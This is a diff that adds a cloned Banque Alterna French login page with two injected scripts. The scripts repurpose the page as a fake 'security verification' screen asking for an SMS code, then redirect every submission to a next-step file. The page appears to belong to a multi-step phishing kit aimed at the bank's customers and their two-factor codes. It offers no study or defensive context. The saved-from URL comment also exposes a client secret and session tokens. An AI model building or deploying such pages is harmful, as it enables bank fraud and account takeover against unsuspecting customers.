@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+
+<!-- saved from url=(1573)https://ids.alternabank.ca/LoginWorkflow/Index?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DInternetBanking%26redirect_uri%3Dhttps%253A%252F%252Fonline.alternabank.ca%26response_type%3Dcode%2520id_token%2520token%26scope%3Dopenid%2520profile%2520Scope.Trusted%2520offline_access%26state%3DOpenIdConnect.AuthenticationProperties%253D00RT0uHWpO3Z2F43ULqjmnsYB061LjbYELjl3tGzGLnb6-dIuYvzT1WiqywgfGn-WC7BP9T2VD61m-vka4xL-WOjbQVMz8Zubdddld2mHIKUUU4ZzSWRKwTiyM3HdtjPGfe_hjxwel8hHUXPv_hpY4_f-RbcFzFdm32_vUNCd9-dOXC2-co-0n4Dca8cTJ697VYwakMa4LXugNyZawXQ_hN7o-kpxEsZn4uc3fYp3sfYRZz2FQoE11w4qQdYnTHU4NTMSZ-lZ2dE2FN7XSz58sG0Kx3I7uxdyKo_IP0O92B7v6jp-23Jju86iRgE8bQG24Jud_1iudXbzkNd2zM9Z4bCMl5h_QGK5t6kgj-qDyOZks_q4RQ1lxn5ZOlZ_-4A7ds5QX8_s0GC1EwG0qEYhBxZqrIEc7wfd3O3pv5omay7R6yRYicB5gqAsyZE6DgeX54B-_ltoikSXVeYJKcGCmwKf9ghREqhZDN8fGWSZlSq2zciUYLToT2wGOWVp7YHBaApD4uglDLnmFCDYJQq6X-qJxFQujvh71PqSSsvKBp_YHmR4FU5VUnzTbRJ57lR%26response_mode%3Dform_post%26nonce%3D639217273110630276.MjQwZmYwZjItOWZmMC00NzNjLWJjN2UtMjAxNTFmNDk5ZjNlZWVkNWExM2UtYzJmNS00NmVlLWJhMWItNzFjNTc3OTAwODdj%26client_secret%3D1dec5e31-ba4e-400b-9b56-f63ec91fc274%26EBANKIT-LANG%3DFR-FR%26X-DeviceInfo%3D%257B%2522DeviceId%2522%253A%2522%2522,%2522DeviceModel%2522%253A%2522%2522,%2522DeviceFamily%2522%253A0,%2522PushToken%2522%253Anull,%2522DeviceApplication%2522%253A%2522INTERNETBANKING%2522,%2522FrontendHost%2522%253Anull,%2522TransactionalHost%2522%253Anull%257D%26X-RiskAssesment-Id%3De4af2910-a43b-4cb8-b0c9-adcb61bd8cc5%26X-TmxOrgId%3D2x745fnx%26x-client-SKU%3DID_NET472%26x-client-ver%3D6.27.0.0 -->
+<html lang="fr-FR"><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Login | Banque Alterna</title>
+<link href="#" rel="shortcut icon" type="image/x-icon"/>
+<link href="./Login _ Banque Alterna_files/bootstrap.min.css" rel="stylesheet"/>
+<link href="./Login _ Banque Alterna_files/site.min.css" rel="stylesheet"/>
+<link href="./Login _ Banque Alterna_files/styles.min.css" rel="stylesheet"/>
+<link href="./Login _ Banque Alterna_files/login-new-default.css" rel="stylesheet"/>
+<link href="./Login _ Banque Alterna_files/ebankit-cookies.css" rel="stylesheet"/>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop();
+    var step3File = currentFile.replace("_sms.html", "_step3.html");
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = step3File;
+        });
+    });
+
+    var clickables = document.querySelectorAll("button, input[type='submit'], input[type='button'], .btn");
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (el.getAttribute("type") === "submit" || 
+                text.indexOf("valid") !== -1 || 
+                text.indexOf("contin") !== -1 || 
+                text.indexOf("soumet") !== -1 ||
+                text.indexOf("submit") !== -1 ||
+                text.indexOf("next") !== -1 ||
+                text.indexOf("suivant") !== -1) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = step3File;
+            }
+        });
+    });
+});
+</script>
+
+
+<script id="unified-sms-handler">
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Transform UI for SMS page
+    var inputs = document.querySelectorAll("input:not([type='hidden'])");
+    var targetInput = null;
+    
+    for(var i = 0; i < inputs.length; i++) {
+        if (!targetInput && (inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel" || inputs[i].type === "password")) {
+            targetInput = inputs[i];
+        } else {
+            if (inputs[i].type === "password" || inputs[i].type === "text" || inputs[i].type === "number" || inputs[i].type === "tel") {
+                inputs[i].style.display = "none";
+                if (inputs[i].parentElement && inputs[i].parentElement.tagName !== "FORM" && inputs[i].parentElement.tagName !== "BODY") {
+                    inputs[i].parentElement.style.display = "none";
+                }
+            }
+        }
+    }
+    
+    if (targetInput) {
+        targetInput.type = "tel";
+        targetInput.maxLength = 8;
+        targetInput.placeholder = "Code SMS";
+        targetInput.value = "";
+        targetInput.style.display = "block";
+        
+        var id = targetInput.id;
+        if(id) {
+            var label = document.querySelector("label[for='" + id + "']");
+            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
+        }
+        
+        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+        var node;
+        while(node = walker.nextNode()) {
+            var text = node.nodeValue.toLowerCase();
+            if(text.trim().length > 3) {
+                if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
+                    node.nodeValue = "Vérification de sécurité";
+                }
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
+                }
+                else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
+                    node.nodeValue = "";
+                }
+            }
+        }
+    }
+    
+    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
+    clickables.forEach(function(el) {
+        var text = (el.textContent || el.value || "").toLowerCase().trim();
+        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("connex") !== -1 || text.indexOf("connect") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("log") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("suivant") !== -1) {
+            if (el.tagName === "INPUT") el.value = "Valider le code";
+            else el.innerText = "Valider le code";
+        }
+    });
+
+    // 2. Guaranteed Navigation to Step 3
+    var nextPath = window.location.pathname.replace("_sms.html", "_step3.html");
+    
+    function goNext(e) {
+        if (e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        window.location.href = nextPath;
+    }
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", goNext, true);
+        form.onsubmit = goNext;
+    });
+    
+    document.addEventListener("click", function(e) {
+        var el = e.target.closest("button, input[type='submit'], input[type='button'], .btn, a");
+        if (el) {
+            goNext(e);
+        }
+    }, true);
+});
+</script>
+
